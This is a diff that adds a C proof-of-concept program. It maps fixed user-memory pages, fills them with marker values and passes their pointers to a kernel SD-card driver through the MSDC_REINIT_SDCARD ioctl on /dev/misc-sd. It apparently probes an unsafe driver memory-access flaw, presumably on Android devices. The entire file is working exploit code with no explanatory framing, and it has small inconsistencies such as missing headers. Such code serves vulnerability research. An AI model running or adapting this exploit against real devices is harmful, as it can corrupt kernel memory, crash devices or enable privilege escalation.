@@ -1,0 +1,113 @@
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <linux/unistd.h>
+
+#include <linux/in.h>
+
+#define MSDC_DRIVING_SETTING              (0)
+#define MSDC_CLOCK_FREQUENCY              (1)
+#define MSDC_SINGLE_READ_WRITE            (2)
+#define MSDC_MULTIPLE_READ_WRITE          (3)
+#define MSDC_GET_CID                      (4)
+#define MSDC_GET_CSD                      (5)
+#define MSDC_GET_EXCSD                    (6)
+#define MSDC_ERASE_PARTITION              (7)
+#define MSDC_HOPPING_SETTING              (8)
+#define MSDC_REINIT_SDCARD 0x404
+
+struct msdc_ioctl
+{
+    int opcode;
+    int host_num;
+    int iswrite;
+    int trans_type;
+    unsigned int total_size;
+    unsigned int address;
+    unsigned int *buffer;
+    int cmd_pu_driving;
+    int cmd_pd_driving;
+    int dat_pu_driving;
+    int dat_pd_driving;
+    int clk_pu_driving;
+    int clk_pd_driving;
+    int clock_freq;
+    int partition;
+    int hopping_bit;
+    int hopping_time;
+    int result;
+    int sd30_mode;
+    int sd30_max_current;
+    int sd30_drive;
+    int sd30_power_control;
+};
+
+int main(int argc, char const *argv[])
+{
+    int ret = 0;
+    int i = 0;
+    int fd = 0;
+    struct msdc_ioctl arg = { 0 };
+    unsigned long write_data = 0l;
+    unsigned long read_data = 0l;
+
+    printf("[+] HuNg\n");
+
+
+    write_data = (unsigned long)mmap((void *)0x20000, 0x1000,
+                    PROT_READ | PROT_WRITE | PROT_EXEC,
+                    MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
+    if (write_data != 0x20000)
+        perror("write_data");
+    for (i = 0; i < 0x1000 / 4; ++i)
+        *(unsigned long *)(write_data + sizeof(unsigned long) * i) = 0xdeadbeef;
+
+    read_data = (unsigned long)mmap((void *)0x40000, 0x1000,
+                    PROT_READ | PROT_WRITE | PROT_EXEC,
+                    MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
+    if (read_data != 0x40000)
+        perror("read_data");
+    for (i = 0; i < 0x1000 / 4; ++i)
+        *(unsigned long *)(read_data + sizeof(unsigned long) * i) = 0x41414141;
+
+    fd = open("/dev/misc-sd", O_RDWR);
+    if (fd < 0)
+    {
+        perror("open");
+        return -1;
+    }
+
+    arg.opcode = MSDC_MULTIPLE_READ_WRITE;
+    arg.total_size = 512;
+
+    arg.iswrite = 1;
+    arg.buffer = (void *)write_data;
+    errno = 0;
+    ret = ioctl(fd, MSDC_REINIT_SDCARD, &arg);
+    printf("ret=%d, %s\n", ret, strerror(errno));
+
+    for (i = 0; i < 0x10 / 4; ++i)
+        printf("%lx=%lx\n", read_data + i * 4,
+            *(unsigned long *)(read_data + sizeof(unsigned long) * i));
+
+    arg.buffer = (void *)read_data;
+    arg.iswrite = 0;
+    errno = 0;
+    ret = ioctl(fd, MSDC_REINIT_SDCARD, &arg);
+    printf("ret=%d, %s\n", ret, strerror(errno));
+
+    for (i = 0; i < 0x10 / 4; ++i)
+        printf("%lx=%lx\n", read_data + i * 4,
+            *(unsigned long *)(read_data + sizeof(unsigned long) * i));
+
+    close(fd);
+
+    return 0;
+}
